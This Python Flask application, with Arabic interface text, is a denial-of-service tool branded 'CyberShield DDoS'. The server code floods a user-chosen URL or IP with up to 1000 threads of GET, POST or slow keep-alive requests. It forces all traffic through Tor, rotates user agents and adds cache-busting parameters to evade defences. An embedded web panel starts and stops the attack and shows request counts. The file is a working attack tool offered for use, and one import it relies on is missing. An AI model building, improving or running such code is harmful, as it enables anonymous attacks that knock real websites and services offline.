from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import threading
import time
import random
import requests
import socks
import socket

app = Flask(__name__)
CORS(app)

# ========== إعدادات Tor الإجبارية ==========
TOR_PROXY = {
    'http': 'socks5://127.0.0.1:9050',
    'https': 'socks5://127.0.0.1:9050'
}

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1'
]

# ========== حالة الهجوم ==========
attack_state = {
    'running': False,
    'target': '',
    'threads': 0,
    'mode': 'get',
    'total': 0,
    'success': 0,
    'fail': 0,
    'start_time': 0,
    'stop_flag': False
}

# ========== فحص Tor ==========
def check_tor():
    """تفحص إذا كان Tor (Orbot) شغال على المنفذ 9050"""
    try:
        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_socket.settimeout(3)
        test_socket.connect(('127.0.0.1', 9050))
        test_socket.close()
        return True
    except:
        return False

# ========== دوال مساعدة ==========
def get_random_ua():
    return random.choice(USER_AGENTS)

def get_session():
    if not check_tor():
        raise Exception("⚠️ Tor غير متصل! يرجى تشغيل Orbot أولاً.")
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_ua(),
        'Accept': '*/*',
        'Accept-Language': 'ar,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'DNT': '1',
        'Connection': 'keep-alive'
    })
    session.proxies.update(TOR_PROXY)
    return session

def send_request(target_url, mode='get'):
    try:
        session = get_session()
        url = target_url
        if '?' not in url:
            url += f"?_={int(time.time()*1000)}&r={random.randint(1,999999)}"
        else:
            url += f"&_={int(time.time()*1000)}&r={random.randint(1,999999)}"
        
        if mode == 'post':
            response = session.post(url, json={'x': random.random()}, timeout=10)
        elif mode == 'slow':
            session.headers['Connection'] = 'keep-alive'
            session.headers['Keep-Alive'] = 'timeout=9999, max=1000'
            response = session.get(url, timeout=10)
        else:
            response = session.get(url, timeout=10)
        
        return response.status_code in [200, 403, 404, 500, 502, 503]
    except Exception as e:
        if 'Tor غير متصل' in str(e):
            raise
        return False

def worker():
    while attack_state['running'] and not attack_state['stop_flag']:
        try:
            result = send_request(attack_state['target'], attack_state['mode'])
            attack_state['total'] += 1
            if result:
                attack_state['success'] += 1
            else:
                attack_state['fail'] += 1
        except Exception as e:
            if 'Tor غير متصل' in str(e):
                attack_state['running'] = False
                attack_state['stop_flag'] = True
                raise
            attack_state['total'] += 1
            attack_state['fail'] += 1

def attack_loop():
    with ThreadPoolExecutor(max_workers=attack_state['threads']) as executor:
        futures = []
        for _ in range(attack_state['threads']):
            futures.append(executor.submit(worker))
        while attack_state['running'] and not attack_state['stop_flag']:
            time.sleep(0.1)
        attack_state['running'] = False

# ========== Routes ==========
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/check-tor', methods=['GET'])
def check_tor_status():
    connected = check_tor()
    return jsonify({
        'connected': connected,
        'message': '✅ Tor متصل' if connected else '❌ Tor غير متصل! يرجى تشغيل Orbot'
    })

@app.route('/start', methods=['POST'])
def start_attack():
    if attack_state['running']:
        return jsonify({'status': 'error', 'message': 'هجوم قيد التشغيل بالفعل'})
    
    # فحص Tor أولاً
    if not check_tor():
        return jsonify({
            'status': 'error',
            'message': '⚠️ Tor غير متصل! يرجى تشغيل تطبيق Orbot أولاً على المنفذ 9050'
        })
    
    data = request.json
    target = data.get('target', '').strip()
    threads = int(data.get('threads', 100))
    mode = data.get('mode', 'get')
    
    if not target:
        return jsonify({'status': 'error', 'message': 'الهدف مطلوب'})
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    attack_state['running'] = True
    attack_state['stop_flag'] = False
    attack_state['target'] = target
    attack_state['threads'] = max(1, min(threads, 1000))
    attack_state['mode'] = mode
    attack_state['total'] = 0
    attack_state['success'] = 0
    attack_state['fail'] = 0
    attack_state['start_time'] = time.time()
    
    threading.Thread(target=attack_loop, daemon=True).start()
    
    return jsonify({'status': 'success', 'message': 'بدأ الهجوم عبر Tor'})

@app.route('/stop', methods=['POST'])
def stop_attack():
    attack_state['stop_flag'] = True
    attack_state['running'] = False
    return jsonify({'status': 'success', 'message': 'تم إيقاف الهجوم'})

@app.route('/status', methods=['GET'])
def get_status():
    elapsed = int(time.time() - attack_state['start_time']) if attack_state['start_time'] else 0
    rate = attack_state['total'] / elapsed if elapsed > 0 else 0
    
    return jsonify({
        'running': attack_state['running'],
        'target': attack_state['target'],
        'threads': attack_state['threads'],
        'mode': attack_state['mode'],
        'total': attack_state['total'],
        'success': attack_state['success'],
        'fail': attack_state['fail'],
        'elapsed': elapsed,
        'rate': round(rate, 1),
        'tor_connected': check_tor()
    })

# ========== HTML Template ==========
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberShield - DDoS Tool</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #050a0f; font-family: 'Cairo', sans-serif; color: #00ff41; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 700px; width: 100%; padding: 20px; background: rgba(0,255,65,0.02); border: 1px solid rgba(0,255,65,0.1); border-radius: 12px; }
        h1 { font-family: 'Orbitron', monospace; font-size: 24px; text-align: center; margin-bottom: 20px; color: #00ff41; }
        .tor-status { display: flex; align-items: center; gap: 10px; padding: 10px 14px; border-radius: 8px; margin-bottom: 16px; font-size: 14px; }
        .tor-status.on { background: rgba(0,255,65,0.08); border: 1px solid rgba(0,255,65,0.2); color: #00ff41; }
        .tor-status.off { background: rgba(255,0,64,0.08); border: 1px solid rgba(255,0,64,0.2); color: #ff0040; }
        .tor-status .dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
        .tor-status .dot.on { background: #00ff41; box-shadow: 0 0 10px rgba(0,255,65,0.3); }
        .tor-status .dot.off { background: #ff0040; box-shadow: 0 0 10px rgba(255,0,64,0.3); }
        .tor-status .dot.checking { background: #ff8800; animation: pulse 1s infinite; }
        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
        .form-group { margin-bottom: 12px; }
        .form-group label { display: block; font-size: 12px; color: rgba(0,255,65,0.6); margin-bottom: 4px; }
        .form-control { width: 100%; padding: 10px 14px; background: rgba(0,255,65,0.04); border: 1px solid rgba(0,255,65,0.1); border-radius: 6px; color: #00ff41; outline: none; }
        .form-control:focus { border-color: #00ff41; }
        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        .btn { padding: 12px 20px; border: 1px solid #00ff41; background: transparent; color: #00ff41; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; transition: all 0.3s; width: 100%; }
        .btn:hover:not(:disabled) { background: rgba(0,255,65,0.08); }
        .btn:disabled { opacity: 0.3; cursor: not-allowed; }
        .btn-start { border-color: #00ff41; color: #00ff41; }
        .btn-start:disabled { border-color: #333; color: #333; }
        .btn-stop { border-color: #ff0040; color: #ff0040; }
        .btn-stop:hover:not(:disabled) { background: rgba(255,0,64,0.08); }
        .btn-stop:disabled { border-color: #333; color: #333; }
        .stats { display: grid; grid-template-columns: repeat(4,1fr); gap: 8px; margin: 16px 0; }
        .stat { background: rgba(0,255,65,0.02); border: 1px solid rgba(0,255,65,0.05); border-radius: 6px; padding: 8px; text-align: center; }
        .stat .num { font-size: 20px; font-weight: bold; }
        .stat .label { font-size: 10px; color: rgba(0,255,65,0.4); }
        .log { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,65,0.05); border-radius: 6px; padding: 8px 12px; max-height: 80px; overflow-y: auto; font-size: 11px; color: rgba(0,255,65,0.7); }
        .log .entry { border-bottom: 1px solid rgba(0,255,65,0.02); padding: 2px 0; }
        .warning-msg { color: #ff8800; font-size: 13px; text-align: center; margin: 6px 0; }
        @media(max-width:500px){ .form-row { grid-template-columns:1fr; } .stats { grid-template-columns:1fr 1fr; } }
    </style>
</head>
<body>
<div class="container">
    <h1>🛡️ CyberShield DDoS</h1>
    
    <div class="tor-status off" id="torStatus">
        <span class="dot off" id="torDot"></span>
        <span id="torText">⏳ جاري التحقق من Tor...</span>
    </div>
    
    <div class="form-group">
        <label>🎯 الهدف (URL / IP)</label>
        <input type="text" id="target" class="form-control" placeholder="example.com / 192.168.1.1">
    </div>
    
    <div class="form-row">
        <div class="form-group">
            <label>🧵 عدد الخيوط</label>
            <input type="number" id="threads" class="form-control" value="100" min="1" max="1000">
        </div>
        <div class="form-group">
            <label>⚡ وضع الهجوم</label>
            <select id="mode" class="form-control">
                <option value="get">GET</option>
                <option value="post">POST</option>
                <option value="slow">SLOW</option>
            </select>
        </div>
    </div>
    
    <div style="display:flex; gap:10px; margin:12px 0;">
        <button class="btn btn-start" id="startBtn" disabled>▶ بدء</button>
        <button class="btn btn-stop" id="stopBtn" disabled>⏹ إيقاف</button>
    </div>
    
    <div class="stats">
        <div class="stat"><div class="num" id="total">0</div><div class="label">إجمالي</div></div>
        <div class="stat"><div class="num" id="success" style="color:#00ff41;">0</div><div class="label">ناجح</div></div>
        <div class="stat"><div class="num" id="fail" style="color:#ff0040;">0</div><div class="label">فاشل</div></div>
        <div class="stat"><div class="num" id="rate">0</div><div class="label">طلب/ث</div></div>
    </div>
    
    <div class="log" id="logBox">
        <div class="entry">[🟢] النظام جاهز - ينتظر اتصال Tor</div>
    </div>
</div>

<script>
    let statusInterval = null;
    let torCheckInterval = null;
    const logBox = document.getElementById('logBox');
    const torStatus = document.getElementById('torStatus');
    const torDot = document.getElementById('torDot');
    const torText = document.getElementById('torText');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    
    function addLog(msg, type='info') {
        const entry = document.createElement('div');
        entry.className = 'entry';
        const time = new Date().toLocaleTimeString();
        const icon = type==='success'?'🟢':type==='error'?'🔴':type==='warning'?'🟡':'🔵';
        entry.textContent = `[${time}] ${icon} ${msg}`;
        logBox.appendChild(entry);
        logBox.scrollTop = logBox.scrollHeight;
        if(logBox.children.length>50) logBox.removeChild(logBox.firstChild);
    }
    
    async function checkTorStatus() {
        try {
            const res = await fetch('/check-tor');
            const data = await res.json();
            if(data.connected) {
                torStatus.className = 'tor-status on';
                torDot.className = 'dot on';
                torText.textContent = '✅ Tor متصل - جاهز للهجوم';
                startBtn.disabled = false;
                addLog('✅ Tor متصل', 'success');
            } else {
                torStatus.className = 'tor-status off';
                torDot.className = 'dot off';
                torText.textContent = '❌ Tor غير متصل! يرجى تشغيل Orbot على المنفذ 9050';
                startBtn.disabled = true;
                if(attackState?.running) stopAttack();
                addLog('❌ Tor غير متصل - يرجى تشغيل Orbot', 'error');
            }
        } catch(e) {
            torStatus.className = 'tor-status off';
            torDot.className = 'dot off';
            torText.textContent = '❌ فشل الاتصال بالخادم';
            startBtn.disabled = true;
        }
    }
    
    async function updateStatus() {
        try {
            const res = await fetch('/status');
            const data = await res.json();
            document.getElementById('total').textContent = data.total.toLocaleString();
            document.getElementById('success').textContent = data.success.toLocaleString();
            document.getElementById('fail').textContent = data.fail.toLocaleString();
            document.getElementById('rate').textContent = data.rate || '0';
            startBtn.disabled = data.running || !data.tor_connected;
            stopBtn.disabled = !data.running;
            if(data.running) {
                addLog(`⚡ جاري الهجوم... إجمالي: ${data.total}`, 'info');
            }
        } catch(e) {}
    }
    
    async function startAttack() {
        const target = document.getElementById('target').value.trim();
        if(!target) { addLog('⚠ الرجاء إدخال هدف', 'warning'); return; }
        
        const data = {
            target: target,
            threads: parseInt(document.getElementById('threads').value) || 100,
            mode: document.getElementById('mode').value
        };
        
        try {
            const res = await fetch('/start', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) });
            const result = await res.json();
            if(result.status==='success') {
                addLog(`🚀 بدأ الهجوم على ${target} عبر Tor`, 'success');
                if(statusInterval) clearInterval(statusInterval);
                statusInterval = setInterval(updateStatus, 500);
            } else {
                addLog(`❌ ${result.message}`, 'error');
                if(result.message.includes('Tor')) {
                    startBtn.disabled = true;
                }
            }
        } catch(e) { addLog('❌ فشل الاتصال بالخادم', 'error'); }
    }
    
    async function stopAttack() {
        try {
            await fetch('/stop', { method:'POST' });
            addLog('⏹ تم إيقاف الهجوم', 'warning');
            if(statusInterval) clearInterval(statusInterval);
            updateStatus();
        } catch(e) {}
    }
    
    document.getElementById('startBtn').addEventListener('click', startAttack);
    document.getElementById('stopBtn').addEventListener('click', stopAttack);
    
    // فحص Tor كل 3 ثواني
    checkTorStatus();
    torCheckInterval = setInterval(checkTorStatus, 3000);
    setInterval(updateStatus, 2000);
</script>
</body>
</html>
"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)